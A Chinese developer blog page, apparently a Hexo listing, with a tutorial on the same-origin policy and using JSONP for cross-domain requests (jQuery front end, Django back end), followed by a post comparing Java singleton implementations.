域是由三部分组成：URI Schema（协议类型）、host name（域名）、port number（端口号），举个例子：

http://www.a.com这个页面，URI Schema是http，host name是www.a.com，port number是默认的80；
https://www.b.com:8080/test/这个页面，URI Schema是https，host name是www.b.com，port number是8080。

上面两个页面的三个部分全部不相同，所以它们就是不同的域。下面表格可以更好地看出什么是同域：



URL
说明
是否允许通信




http://www.a.com/a.jshttp://www.a.com/b.js
同一域名下
允许


http://www.a.com/lab/a.jshttp://www.a.com/script/b.js
同一域名下不同文件夹
允许


http://www.a.com:8000/a.jshttp://www.a.com/b.js
同一域名，不同端口
不允许


http://www.a.com/a.jshttps://www.a.com/b.js
同一域名，不同协议
不允许


http://www.a.com/a.jshttp://70.32.92.74/b.js
域名和域名对应ip
不允许


http://www.a.com/a.jshttp://script.a.com/b.js
主域相同，子域不同
不允许


http://www.a.com/a.jshttp://a.com/b.js
同一域名，不同二级域名（同上）
不允许


http://www.b.com/a.jshttp://www.a.com/b.js
不同域名
不允许



 同源策略
它限制了某个域下的文档或者js与另一个域中的资源交互的方式，它提供了一种安全机制，这种安全机制可以避免来自恶意网站的攻击。同源策略要求浏览器允许来自某个网页上的js请求来自另一个网页的数据，当且仅当两个页面来自相同的域。
通过同源策略可以阻止来自恶意网站的脚本通过其他网站的DOM获取其他网站的信息。可以避免CSRF和XSS攻击。

同源策略限制的是浏览器或者其他提供类似浏览器服务的软件，这只是一个规范，所以浏览器是否遵守这个规范也不一定，所以IE浏览器判断同源的时候就不必考虑端口号；
同源策略限制的js，而图片、css这些事不存在同源策略限制的

 jsonp方式的原理

浏览器的同源策略把跨域请求都禁止了
HTML的&lt;script&gt;标签是例外，可以突破同源策略从其他来源获取数据
我们可以通过&lt;script&gt;标签引入jsonp文件，然后通过一系列JS操作获取数据

实现方法：通过页面中增加一个&lt;script&gt;标签，标签的src指向的是另外一个域的能够提供数据的url，同时将一个本地的callback方法传给服务端，服务端返回的时候将会自动指向callback方法。


通过JS在页面中append如下标签
 1&lt;script type="application/javascript" src="http://www.b.com/test?callback=parseResponse"&gt;&lt;/script&gt;
增加该标签之后，浏览器就会立即去请求这个url，由于&lt;script src=&quot;&quot;&gt;方式是不受同源策略限制的，可以避免跨域限制。


服务端收到callback参数之后，将它拼接在返回的数据中，返回的数据如下：
 1parseResponse(&#123;"name":"hax", "gender":"Male"&#125;);


这样返回之后，就调用页面上的parseResponse方法，就达到了数据处理的目的。


最后将刚刚新增加到页面中的&lt;script&gt;元素删除。


 采用jsonp解决跨域问题
由于本人技术水平有限，也在网上找了许多方案，但是大多没有成功（主要自己太菜了），最后结合了多个博客的讲解以及尝试，最后使用jsonp成功解决了自己遇到的问题，不过写这篇博客距离当时解决所隔时间太长，无法列出当时帮助到自己的大神们，求谅解。
由于后台采用了Django，故后台使用Python进行演示，其他的后台框架仿照完成即可。
 前端
代码如下：
1234567891011121314151617181920function submitComment(url) &#123;    $.ajax(&#123;        type: 'GET',        url: url,        data: $("#forml").serialize(),        crossDomain: true,        dataType: 'jsonp',        jsonp: 'callback',        jsonpCallback: 'callback',        success: function(response)&#123;            console.log(response);        &#125;,        error: function()&#123;            console.log('Ajax error!');        &#125;,        complete: function() &#123;            console.log("complete");        &#125;,    &#125;);&#125;
以上各参数详解：



参数名
参数类型
默认值
解析




type
String
‘GET’
请求方式(‘POST’或’GET’)，其他HTTP请求方法，如PUT和DELETE也可使用，但是仅部分浏览器支持


url
String
当前页地址
发送请求地址


data
String

发送服务器的数据。将自动转换为请求字符串格式，其他详细解析课件w3school


crossDomain
Boolean
同域请求为false，跨域请求为true
若想在同一域内强制跨域请求(如jsonp形式)，例如，想让服务器重定向到另一个域，则需要将其设置为true


dataType
String

预期服务器返回的数据类型，详细可用值见下表


jsonp
String

在一个jsonp请求中重写回调函数的名字。这个值用来替代在&quot;callback=？&quot;这种GET或POST请求中的URL参数里的callback部分


jsonpCallback
String
jQuery自动生成的随机函数名
为jsonp请求指定回调函数名，用来取代自动生成的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理


success
Function

请求成功后的回调函数。有服务器返回，并根据dataType参数进行处理后的数据


error
Function

请求失败时调用此函数，具体可见w3school


complete
Function

请求完成后的回调函数(请求成功与失败都调用)，具体可见w3school



dataType可用值表：



可用值
解析




xml
返回XML文档，可用jQuery处理


html
返回纯文本HTML信息


script
返回纯文本JavaScript代码，不会自动缓存结果


json
返回json数据


jsonp
jsonp格式数据。使用JSONP形式调用函数时，如&quot;myurl?callback=?&quot;jQuery将自动替换?为正确的函数名，以执行回调函数


text
返回纯文本字符串



注意：

由于采用跨域请求，不管我们如何设置type参数，请求方式一定为GET
开始调试时，每次在控制台都可以看到response，但是success的function就是没有调用，每次都是调用了error和complete的function，后来网上一直查，最终发现后台也需要相应的配合
由于不太明白jsonp与jsonpCallback参数的用法，所以直接将两个参数值赋一样的值

 Django后台
代码如下：
12345678910111213141516def get_shop_comment(request):    # 以下是一些从请求中取出参数的操作    省略......    try:        result = dict()        result["returnInfo"] = 1        comment_list = list()        # 以下代码是将数据库的操作，查到后append到comment_list里        省略......        result["data"] = comment_list        return_result = json.dumps(result)        data = '%s(%s);' % ('callback', return_result)        return HttpResponse(data, 'text/javascript')    except Exception as e:        data = '%s(%s);' % ('callback', &#123;'result': e.message&#125;)        return HttpResponse(data, 'text/javascript')
注意：

跨域请求方式都是GET
返回一定要用HttpResponse，不能使用JsonResponse
开始当只有返回一个参数时，并没用使用json.dumps()方法，前台可以正常调用success的方法。后来当有多个参数时，前台就一直调用error和complete的方法，后来自己尝试使用了dumps之后，发现就正常了

 参考资料

W3school的《jQuery ajax - ajax() 方法》
Rain Man的《JavaScript跨域总结与解决办法》
一条大河波浪宽的《ajax跨域请求原理及解决方案分析》
别天的《JSONP原理及实现跨域方式》

</div><a class="more" href="/CORS-JSONP/#more" style="margin-top: 14px">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/singleton-mode/">单例模式</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2017-09-21</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">设计模式</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">设计模式</a></span><div class="content"> 单例模式的特点

单例类只能有一个实例
单例类必须创建自己唯一的实例
单例类必须给其他对象提供这一实例

 饿汉 vs 懒汉

饿汉：声明实例引用时即实例化
懒汉：静态方法第一次被调用前不实例化，也即懒加载。对于创建实例代价大，且不定会使用时，使用懒加载可以减少开销

 解决方案
 在多线程环境中能工作，但是效率不高，不建议面试采用（懒汉）
12345678910public class Singleton1 &#123;    private Singleton1 &#123;&#125;    private static Singleton1 instance;    public static synchronized Singleton1 getInstance() &#123;        if (instance == null) &#123;            instance = new Singleton1();        &#125;        return instance;    &#125;&#125;

优点：线程安全，可确保正常使用（不考虑通过反射调用私有构造方法），只有一个实例
缺点：每次获取实例都需要申请锁，开销大，效率低

 加同步锁前后两次判断实例是否存在（懒汉）
1234567891011121314public class Singleton2 &#123;    private Singleton2() &#123;&#125;    private static Singleton2 instance;    public static Singleton2 getInstance() &#123;        if(instance == null) &#123;            synchronized(Singleton2.class) &#123;                if (instance == null) &#123;                    instance = new Singleton2();                &#125;            &#125;        &#125;        return instance;    &#125;&#125;

优点：不需要在每次调用时加锁，效率比上一个高
缺点：虽然使用了synchronized，但本质上是线程不安全的

 双重检查（Double Check）下的懒汉
1234567891011121314public class Singleton3 &#123;    private static volatile Singleton3 instance;    private Singleton3() &#123;&#125;    public static Singleton3 getInstance() &#123;        if (instance == null) &#123;            synchronized(Singleton3.class) &#123;                if (instance == null) &#123;                    instance = new Singleton3();                &#125;            &#125;        &#125;        return instance;    &#125;&#125;

优点：使用了双重检查，避免了线程不安全，同时避免了不必要的锁开销
缺点：无
注意：使用volatile关键字的目的不是保证可见性（synchronized已经保证了可见性），而是为了保证顺序性。具体来说，instance = new Singleton3()不是原子操作，实际上被拆分为了三步：1) 分配内存；2) 初始化对象；3) 将instance指向分配的对象内存地址。 如果没有volatile，可能会发生指令重排序，使得instance先指向内存地址，而对象尚未初始化，其它线程直接使用instance引用进行对象操作时出错。详细原理可参见《双重检查锁定与延迟初始化》

 利用静态变量（饿汉）
1234567public class Singleton4 &#123;    private Singleton4() &#123;&#125;    private static Singleton4 instance = new Singleton4();    public static Singleton4 getInstance() &#123;        return instance;    &#125;&#125;

优点：实现简单，无线程同步问题
缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费

 利用静态代码块（饿汉）
12345678910public class Singleton5 &#123;    private static Singleton5 instance;    private Singleton5() &#123;&#125;    static &#123;        instance = new Singleton5();    &#125;    public static Singleton5 getInstance() &#123;        return instance;    &#125;&#125;

优点：实现简单，无线程同步问题
缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费

 实现按需创建实例（强烈推荐）（懒汉）
123456789public class Singleton6 &#123;    private Singleton6() &#123;&#125;    private static class Nested &#123;        private static Singleton6 instance = new Singleton6();    &#125;    public static Singleton6 getInstance() &#123;        return Nested.instance;    &#125;&#125;

优点：无线程同步问题，实现了懒加载。因为只有调用getInstance()时才会装载内部类，才会创建实例。同时因为使用内部类，先调用内部类的线程会获得类初始化锁，从而保证内部类的初始化（包括实例化它所引用的外部类对象）线程安全。即使内部类创建外部类的实例Singleton6 instance = new Singleton6()发生指令重排也不会引起双重检查下的懒汉模式中提到的问题，因此无须使用volatile关键字。
缺点：无

 参考资料


java_my_life的《JAVA与模式》之单例模式
技术世界的Java设计模式（十） 你真的用对单例模式了吗？
InfoQ的双重检查锁定与延迟初始化

《剑指offer》（第二版）

</div><a class="more" href="/singleton-mode/#more" style="margin-top: 14px">Read more</a><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/public/blog.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Toyan</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" data-click="false"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>